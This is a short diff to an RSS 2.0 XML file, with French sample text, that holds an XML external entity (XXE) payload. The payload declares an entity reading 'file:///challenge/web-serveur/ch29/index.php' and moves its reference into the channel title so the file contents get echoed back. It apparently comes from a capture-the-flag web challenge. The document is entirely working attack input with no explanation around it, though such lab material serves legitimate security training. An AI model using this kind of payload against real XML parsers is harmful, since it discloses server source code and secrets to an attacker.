@@ -2,12 +2,12 @@
 <!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///challenge/web-serveur/ch29/index.php"> ]>
 <rss version="2.0">
     <channel>
-        <title>hein</title>
+        <title>&file;</title>
         <description>Ceci est un exemple de flux RSS 2.0</description>
         <lastBuildDate>Sat, 07 Sep 2002 00:00:01 GMT</lastBuildDate>
         <link>http://www.example.org</link>
         <item>
-            <title>&file;</title>
+            <title>AAAAAA</title>
             <description>Ceci est ma première actualité</description>
             <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
             <link>http://www.example.org/actu1</link>
